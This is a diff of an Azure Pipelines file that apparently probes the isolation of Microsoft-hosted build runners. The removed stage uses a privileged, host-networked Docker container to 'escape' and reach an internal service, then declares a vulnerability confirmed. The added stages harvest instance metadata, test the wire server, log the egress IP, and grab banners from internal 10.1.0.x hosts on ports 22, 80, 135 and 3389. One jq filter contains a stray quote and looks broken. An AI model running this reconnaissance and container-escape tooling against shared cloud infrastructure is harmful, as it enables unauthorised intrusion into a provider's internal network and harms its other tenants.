@@ -1,68 +1,437 @@
 # azure-pipelines.yml
-trigger:
-- main
-pr:
-- main
+# Evidence + similarity vectors for Azure-hosted runners on Linux & Windows.
+# Drops artifacts: azure-evidence-linux, azure-evidence-windows
+# Toggle gated Docker demo with variable AGGRESSIVE = true
 
-name: $(Date:yyyyMMdd)$(Rev:.r)
+trigger:
+  branches:
+    include:
+      - main
+      - master
+pr:
+  branches:
+    include:
+      - "*"
+
+variables:
+  AGGRESSIVE: 'false'         # set to 'true' in UI/variables to enable gated Docker probe
+  # Known internal targets to (safely) banner grab. Override in UI if needed.
+  LINUX_TARGETS: '10.1.0.220:80 10.1.0.220:3389 10.1.0.220:135 10.1.0.201:22'
+  WINDOWS_TARGETS: '10.1.0.220:80,10.1.0.220:3389,10.1.0.220:135,10.1.0.201:22'
 
 stages:
-- stage: FinalPoc
-  displayName: 'Final PoC: Direct HTTP Probe'
+- stage: evidence
+  displayName: Collect Evidence
   jobs:
-  - job: Linux_HTTP_Probe
-    displayName: 'PoC: Probe Discovered Service via HTTP'
+
+  # -------------------- L I N U X --------------------
+  - job: linux_evidence
+    displayName: "Linux evidence (ubuntu-22.04)"
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: none
-    - task: Bash@3
-      displayName: 'Escape Container and Probe Target Service with Curl'
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts
+      - checkout: self
+        clean: true
 
-          echo "--- Verifying container escape vector ---"
-          if ! (id | grep -q '(docker)'); then
-            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
-            id
-            exit 1
-          fi
-          echo "✅ Confirmed user is in 'docker' group."
+      - task: Bash@3
+        displayName: "Install tooling"
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -u
+            mkdir -p artifacts/linux
+            sudo apt-get update -y
+            sudo apt-get install -y jq curl dnsutils inetutils-traceroute netcat-openbsd whois openssl
 
-          TARGET_IP="10.1.0.156"
-          TARGET_PORT="8084"
+      - task: Bash@3
+        displayName: "IMDS + wire-server + egress provenance"
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -u
+            outdir="artifacts/linux"
 
-          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} with a clean HTTP request ---"
-          
-          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
-            alpine:latest sh -c "
-              apk add --no-cache curl
+            echo "### IMDS (instance metadata)"
+            curl -sS -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | tee "$outdir/imds.json" >/dev/null
+            curl -sS -H Metadata:true "http://169.254.169.254/metadata/attested/document?api-version=2023-10-01" | tee "$outdir/imds-attested.json" >/dev/null || true
 
-              echo '--- [HOST] Attempting a standard HTTP GET request with curl ---'
-              
-              # Use curl with a longer timeout and verbose logging to capture everything.
-              # This sends a very standard User-Agent and Accept header.
-              curl --verbose --connect-timeout 20 "http://${TARGET_IP}:${TARGET_PORT}/" > /artifacts/http_probe_body.txt 2> /artifacts/http_probe_stderr.txt || true
-            "
-          
-          echo "✅ PROBE COMPLETE."
-          echo "--- Curl stderr (Connection Details & Headers) ---"
-          cat artifacts/http_probe_stderr.txt
-          echo
-          echo "--- Curl stdout (Response Body) ---"
-          cat artifacts/http_probe_body.txt
+            echo "### Wire server / IMDS reachability" | tee "$outdir/wireserver.txt"
+            for h in "169.254.169.254:80" "168.63.129.16:80" "168.63.129.16:32526"; do
+              host="${h%:*}"; port="${h##*:}"
+              if timeout 1 bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null; then
+                echo "IMDS/Wire $h -> open" | tee -a "$outdir/wireserver.txt"
+              else
+                echo "IMDS/Wire $h -> closed" | tee -a "$outdir/wireserver.txt"
+              fi
+            done
 
-          if [ -s "artifacts/http_probe_body.txt" ] || grep -q "Connected to" artifacts/http_probe_stderr.txt; then
-            echo "✅ VULNERABILITY CONFIRMED: Successfully connected and/or received a response from the internal service."
-          else
-            echo "⚠️ Final attempt inconclusive. The service is running but is not responding to standard HTTP requests."
-          fi
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish HTTP Probe Artifacts'
-      condition: succeededOrFailed()
-      inputs:
-        targetPath: 'artifacts'
-        artifact: 'azure-final-poc-results'
+            echo -e "\nRoutes:" | tee -a "$outdir/wireserver.txt"
+            ip route get 169.254.169.254 2>/dev/null | tee -a "$outdir/wireserver.txt"
+            ip route get 168.63.129.16 2>/dev/null | tee -a "$outdir/wireserver.txt"
+
+            echo "### Egress IP + RDAP/whois" | tee "$outdir/egress.txt"
+            pub_ip="$(curl -sS https://ifconfig.me)"
+            echo "public_ip: $pub_ip" | tee -a "$outdir/egress.txt"
+            # RDAP JSON (may be blocked sometimes; best-effort)
+            curl -sS "https://rdap.arin.net/registry/ip/${pub_ip}" -o "$outdir/egress-rdap.json" || true
+            # Fallback readable WHOIS
+            whois "$pub_ip" > "$outdir/egress-whois.txt" 2>/dev/null || true
+
+      - task: Bash@3
+        displayName: "Safe banner grabs on known targets"
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -u
+            out="artifacts/linux/banner-grabs.txt"
+            : > "$out"
+
+            for target in $LINUX_TARGETS; do
+              ip="${target%:*}"
+              port="${target##*:}"
+              proto="tcp"
+              [ "$port" = "80" ] && proto="http/https"
+
+              echo "== $ip:$port ($proto)" | tee -a "$out"
+
+              # Generic TCP connect probe
+              if timeout 2 bash -c "exec 3<>/dev/tcp/$ip/$port" 2>/dev/null; then
+                echo "connect: open" | tee -a "$out"
+              else
+                echo "connect: failed/filtered" | tee -a "$out"
+              fi
+
+              # If likely HTTP, try banners both plain + with fake Host
+              if [ "$port" = "80" ]; then
+                (curl -sSIk --max-time 3 --connect-timeout 2 "http://$ip:$port" || true) | sed 's/\r$//' | head -n 20 | tee -a "$out"
+                (curl -sSIk --max-time 3 --connect-timeout 2 -H "Host: example.local" "http://$ip:$port" || true) | sed 's/\r$//' | head -n 20 | tee -a "$out"
+                # In case it's actually TLS on :80 behind a TCP proxy:
+                (openssl s_client -brief -connect "$ip:$port" </dev/null 2>/dev/null | head -n 20 || true) | tee -a "$out"
+              fi
+
+              # Quick SSH banner if port 22
+              if [ "$port" = "22" ]; then
+                (echo "" | timeout 3 nc -v "$ip" 22 2>&1 | head -n 5 || true) | tee -a "$out"
+              fi
+
+              echo "" >> "$out"
+            done
+
+      - task: Bash@3
+        displayName: "Optional gated Docker capability demo (NET_RAW, minimal)"
+        condition: and(succeededOrFailed(), eq(variables['AGGRESSIVE'], 'true'))
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -u
+            outdir="artifacts/linux"
+            echo "### Docker availability" | tee "$outdir/docker-audit.txt"
+            id | tee -a "$outdir/docker-audit.txt"
+            groups | tee -a "$outdir/docker-audit.txt" || true
+            ls -l /var/run/docker.sock | tee -a "$outdir/docker-audit.txt" || true
+            docker version | tee -a "$outdir/docker-audit.txt"
+            docker info | tee -a "$outdir/docker-audit.txt"
+            echo "### Demonstrate container with NET_RAW and host network (proof only)" | tee "$outdir/docker-netraw-proof.txt"
+            docker run --rm --network host --cap-add=NET_RAW alpine:3 sh -c 'id; ping -c 1 10.1.0.1 || true' | tee -a "$outdir/docker-netraw-proof.txt"
+
+      - task: Bash@3
+        displayName: "Similarity vectors (TLS, DNS whoami, traceroute, ephemeral range)"
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -u
+            outdir="artifacts/linux"
+            echo "### TLS fingerprints" | tee "$outdir/tls-fingerprints.txt"
+            for h in github.com bitbucket.org login.microsoftonline.com; do
+              echo "-- $h" | tee -a "$outdir/tls-fingerprints.txt"
+              (openssl s_client -brief -alpn "h2,http/1.1" -servername "$h" -connect "$h:443" </dev/null 2>/dev/null | head -n 40 || true) | tee -a "$outdir/tls-fingerprints.txt"
+              echo "" >> "$outdir/tls-fingerprints.txt"
+            done
+
+            echo "### DNS whoami" | tee "$outdir/dns-whoami.txt"
+            (dig +short TXT whoami.cloudflare @1.1.1.1 || true) | tee -a "$outdir/dns-whoami.txt"
+
+            echo "### Traceroutes (first 15 hops)" | tee "$outdir/traceroutes.txt"
+            for d in 1.1.1.1 8.8.8.8 github.com bitbucket.org; do
+              echo "-- traceroute to $d" | tee -a "$outdir/traceroutes.txt"
+              (traceroute -n -w2 -q1 "$d" | head -n 15 || true) | tee -a "$outdir/traceroutes.txt"
+              echo "" >> "$outdir/traceroutes.txt"
+            done
+
+            echo "### Ephemeral port range" | tee "$outdir/ephemeral-range.txt"
+            cat /proc/sys/net/ipv4/ip_local_port_range | tee -a "$outdir/ephemeral-range.txt"
+
+      - task: Bash@3
+        displayName: "Linux summary + checksums"
+        inputs:
+          targetType: 'inline'
+        # keep going even if some pieces were missing
+          script: |
+            set -u
+            outdir="artifacts/linux"
+            summary="$outdir/SUMMARY.txt"
+
+            echo "### LINUX SUMMARY ($(date -u +%FT%TZ))" | tee "$summary"
+            echo "" | tee -a "$summary"
+
+            if [ -f "$outdir/imds.json" ]; then
+              echo "#### IMDS (key fields)" | tee -a "$summary"
+              jq -r '
+                .compute
+                | "subscriptionId:  \(.subscriptionId // "")",
+                  "resourceGroup:   \(.resourceGroupName // "")",
+                  "vmScaleSetName:  \(.vmScaleSetName // "")",
+                  "vmId:            \(.vmId // "")",
+                  "location:        \(.location // "")",
+                  "sku_offer:       \(.storageProfile.imageReference.offer // "/")',
+                  "privateIPv4:     \(.privateIpAddress // "")",
+                  "macAddress:      \(.macAddress // "")",
+                  "subnet:          \(.subnet // "")"
+              ' "$outdir/imds.json" | tee -a "$summary" || true
+              echo "" | tee -a "$summary"
+            fi
+
+            echo "#### Wire server reachability" | tee -a "$summary"
+            cat "$outdir/wireserver.txt" 2>/dev/null | tee -a "$summary" || true
+            echo "" | tee -a "$summary"
+
+            echo "#### Egress" | tee -a "$summary"
+            if [ -f "$outdir/egress.txt" ]; then
+              cat "$outdir/egress.txt" | sed -n '1,12p' | tee -a "$summary"
+            fi
+            if [ -f "$outdir/egress-whois.txt" ]; then
+              # extract a few common fields if present
+              grep -E '^(OrgName|Country|NetName|OriginAS|CIDR|Comment)' -A0 "$outdir/egress-whois.txt" | tee -a "$summary" || true
+            fi
+            echo "" | tee -a "$summary"
+
+            echo "#### Banner grabs (known targets)" | tee -a "$summary"
+            sed -n '1,200p' "$outdir/banner-grabs.txt" 2>/dev/null | tee -a "$summary" || true
+            echo "" | tee -a "$summary"
+
+            if [ -f "$outdir/docker-netraw-proof.txt" ]; then
+              echo "#### Docker NET_RAW proof (gated)" | tee -a "$summary"
+              sed -n '1,80p' "$outdir/docker-netraw-proof.txt" | tee -a "$summary"
+              echo "" | tee -a "$summary"
+            fi
+
+            # Checksums
+            (cd "$outdir" && sha256sum * 2>/dev/null | sort -k2) | tee "$outdir/CHECKSUMS.txt"
+
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish Linux evidence"
+        inputs:
+          artifact: 'azure-evidence-linux'
+          targetPath: '$(Build.SourcesDirectory)/artifacts/linux'
+
+  # -------------------- W I N D O W S --------------------
+  - job: windows_evidence
+    displayName: "Windows evidence (windows-2022)"
+    pool:
+      vmImage: 'windows-2022'
+    steps:
+      - checkout: self
+        clean: true
+
+      - task: PowerShell@2
+        displayName: "IMDS + wire-server + egress provenance"
+        inputs:
+          targetType: 'inline'
+          pwsh: true
+          script: |
+            $ErrorActionPreference = 'Continue'
+            $outDir = "artifacts/windows"
+            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+
+            # IMDS
+            $headers = @{ Metadata = "true" }
+            try {
+              Invoke-RestMethod -Headers $headers -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -TimeoutSec 5 | ConvertTo-Json -Depth 100 | Set-Content "$outDir/imds.json"
+            } catch {}
+            try {
+              Invoke-RestMethod -Headers $headers -Uri "http://169.254.169.254/metadata/attested/document?api-version=2023-10-01" -TimeoutSec 5 | Set-Content "$outDir/imds-attested.json"
+            } catch {}
+
+            # Wire/IMDS reachability
+            $wireOut = @()
+            foreach ($h in @("169.254.169.254:80","168.63.129.16:80","168.63.129.16:32526")) {
+              $host,$port = $h.Split(":")
+              $t = Test-NetConnection -ComputerName $host -Port ([int]$port) -WarningAction SilentlyContinue
+              $wireOut += ("{0} -> {1}" -f $h, ($(if($t.TcpTestSucceeded){"open"} else {"closed"})))
+            }
+            "### Wire server / IMDS reachability`r`n" + ($wireOut -join "`r`n") | Set-Content "$outDir/wireserver.txt"
+            "`r`nRoutes:`r`n" | Add-Content "$outDir/wireserver.txt"
+            (route print) | Add-Content "$outDir/wireserver.txt"
+
+            # Egress + RDAP
+            try {
+              $pub = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 5).Trim()
+              "public_ip: $pub" | Set-Content "$outDir/egress.txt"
+              try {
+                Invoke-RestMethod -Uri "https://rdap.arin.net/registry/ip/$pub" -TimeoutSec 8 | ConvertTo-Json -Depth 100 | Set-Content "$outDir/egress-rdap.json"
+              } catch {
+                Invoke-RestMethod -Uri "https://rdap.db.ripe.net/ip/$pub" -TimeoutSec 8 | ConvertTo-Json -Depth 100 | Set-Content "$outDir/egress-rdap.json"
+              }
+            } catch {}
+
+      - task: PowerShell@2
+        displayName: "Safe banner grabs on known targets"
+        inputs:
+          targetType: 'inline'
+          pwsh: true
+          script: |
+            $ErrorActionPreference = 'Continue'
+            $ProgressPreference = 'SilentlyContinue'
+            $outFile = "artifacts/windows/banner-grabs.txt"
+            New-Item -ItemType Directory -Path "artifacts/windows" -Force | Out-Null
+            $out = New-Object System.Collections.Generic.List[string]
+
+            function Test-Tcp {
+              param([string]$ip, [int]$port)
+              try {
+                $tcp = New-Object System.Net.Sockets.TcpClient
+                $iar = $tcp.BeginConnect($ip,$port,$null,$null)
+                if (-not $iar.AsyncWaitHandle.WaitOne(2000)) { $tcp.Close(); return "connect: failed/filtered" }
+                $tcp.EndConnect($iar) | Out-Null
+                $tcp.Close()
+                return "connect: open"
+              } catch { return "connect: failed/filtered" }
+            }
+
+            function Get-HttpHead {
+              param([string]$ip, [int]$port)
+              try {
+                (Invoke-WebRequest -Uri ("http://{0}:{1}/" -f $ip,$port) -Method Head -TimeoutSec 3 -UseBasicParsing).RawContent -split "`r?`n" | Select-Object -First 20
+              } catch {
+                try {
+                  (Invoke-WebRequest -Uri ("https://{0}:{1}/" -f $ip,$port) -Method Head -TimeoutSec 3 -UseBasicParsing).RawContent -split "`r?`n" | Select-Object -First 20
+                } catch { @("no banner") }
+              }
+            }
+
+            $targets = $env:WINDOWS_TARGETS.Split(",") | Where-Object { $_ -match ":" }
+            foreach ($t in $targets) {
+              $ip,$port = $t.Split(":")
+              $proto = if ($port -eq "80") { "http/https" } else { "tcp" }
+              $out.Add("== $($ip):$port ($proto)")
+              $out.Add((Test-Tcp -ip $ip -port [int]$port))
+              if ($port -eq "80") {
+                $out.AddRange( (Get-HttpHead -ip $ip -port 80) )
+              }
+              if ($port -eq "22") {
+                try {
+                  # attempt to read SSH banner
+                  $client = New-Object System.Net.Sockets.TcpClient($ip,22)
+                  $stream = $client.GetStream()
+                  $bytes = New-Object byte[] 64
+                  Start-Sleep -Milliseconds 400
+                  $read = $stream.Read($bytes,0,$bytes.Length)
+                  if ($read -gt 0) { $out.Add([System.Text.Encoding]::ASCII.GetString($bytes,0,$read).Trim()) }
+                  $client.Close()
+                } catch {}
+              }
+              $out.Add("")
+            }
+
+            $out | Set-Content $outFile -Encoding UTF8
+
+      - task: PowerShell@2
+        displayName: "Similarity vectors (TLS, DNS whoami, traceroute, ephemeral range)"
+        inputs:
+          targetType: 'inline'
+          pwsh: true
+          script: |
+            $ErrorActionPreference = 'Continue'
+            $outDir = "artifacts/windows"
+            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+
+            # TLS fingerprints (subject/issuer/notAfter/sha256)
+            $hosts = @('github.com','bitbucket.org','login.microsoftonline.com')
+            $tlsOut = New-Object System.Collections.Generic.List[string]
+            foreach ($h in $hosts) {
+              try {
+                $tcp = New-Object System.Net.Sockets.TcpClient($h,443)
+                $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, { param($s,$c,$ch,$e) $true })
+                $ssl.AuthenticateAsClient($h)
+                $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 $ssl.RemoteCertificate
+                $tlsOut.Add("-- $h")
+                $tlsOut.Add("subject: " + $cert.Subject)
+                $tlsOut.Add("issuer: " + $cert.Issuer)
+                $tlsOut.Add("notAfter: " + $cert.NotAfter.ToString('o'))
+                $tlsOut.Add("sha256: " + $cert.GetCertHashString('SHA256'))
+                $tlsOut.Add("")
+                $ssl.Dispose(); $tcp.Close()
+              } catch {
+                $tlsOut.Add("-- $h")
+                $tlsOut.Add("error: " + $_.Exception.Message)
+                $tlsOut.Add("")
+              }
+            }
+            $tlsOut | Set-Content "$outDir/tls-fingerprints.txt"
+
+            # DNS whoami
+            try { nslookup -type=txt whoami.cloudflare 1.1.1.1 | Out-String | Set-Content "$outDir/dns-whoami.txt" } catch {}
+
+            # Traceroutes
+            $tOut = New-Object System.Collections.Generic.List[string]
+            foreach ($d in @('1.1.1.1','8.8.8.8','github.com','bitbucket.org')) {
+              $tOut.Add("-- tracert to $d")
+              try { (tracert -d -h 15 $d) | ForEach-Object { $_ } | Set-Content "$outDir/tracert-$($d -replace '[^A-Za-z0-9\.-]','_').txt" } catch {}
+            }
+
+            # Ephemeral port ranges
+            try { (netsh int ipv4 show dynamicport tcp) | Set-Content "$outDir/ephemeral-range.txt" } catch {}
+
+      - task: PowerShell@2
+        displayName: "Windows summary + checksums"
+        inputs:
+          targetType: 'inline'
+          pwsh: true
+          script: |
+            $ErrorActionPreference = 'Continue'
+            $outDir = "artifacts/windows"
+            $summary = Join-Path $outDir "SUMMARY.txt"
+
+            "### WINDOWS SUMMARY ($([DateTime]::UtcNow.ToString('o')))" | Set-Content $summary
+            Add-Content $summary ""
+
+            if (Test-Path "$outDir/imds.json") {
+              $imds = Get-Content "$outDir/imds.json" -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
+              if ($imds -and $imds.compute) {
+                Add-Content $summary "#### IMDS (key fields)"
+                Add-Content $summary ("subscriptionId:  {0}" -f ($imds.compute.subscriptionId))
+                Add-Content $summary ("resourceGroup:   {0}" -f ($imds.compute.resourceGroupName))
+                Add-Content $summary ("vmScaleSetName:  {0}" -f ($imds.compute.vmScaleSetName))
+                Add-Content $summary ("vmId:            {0}" -f ($imds.compute.vmId))
+                Add-Content $summary ("location:        {0}" -f ($imds.compute.location))
+                Add-Content $summary ""
+              }
+            }
+
+            Add-Content $summary "#### Wire server reachability"
+            if (Test-Path "$outDir/wireserver.txt") { Get-Content "$outDir/wireserver.txt" | Select-Object -First 50 | Add-Content $summary }
+            Add-Content $summary ""
+
+            Add-Content $summary "#### Egress"
+            if (Test-Path "$outDir/egress.txt") { Get-Content "$outDir/egress.txt" | Add-Content $summary }
+            if (Test-Path "$outDir/egress-rdap.json") {
+              $rdap = Get-Content "$outDir/egress-rdap.json" -Raw
+              $lines = ($rdap -split "`r?`n" | Select-Object -First 30)
+              Add-Content $summary ($lines -join "`r`n")
+            }
+            Add-Content $summary ""
+
+            Add-Content $summary "#### Banner grabs (known targets)"
+            if (Test-Path "$outDir/banner-grabs.txt") { Get-Content "$outDir/banner-grabs.txt" | Select-Object -First 200 | Add-Content $summary }
+            Add-Content $summary ""
+
+            # Checksums
+            Get-ChildItem $outDir -File | ForEach-Object {
+              (Get-FileHash $_.FullName -Algorithm SHA256).Hash + "  " + $_.Name
+            } | Sort-Object | Set-Content (Join-Path $outDir "CHECKSUMS.txt")
+
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish Windows evidence"
+        inputs:
+          artifact: 'azure-evidence-windows'
+          targetPath: '$(Build.SourcesDirectory)/artifacts/windows'
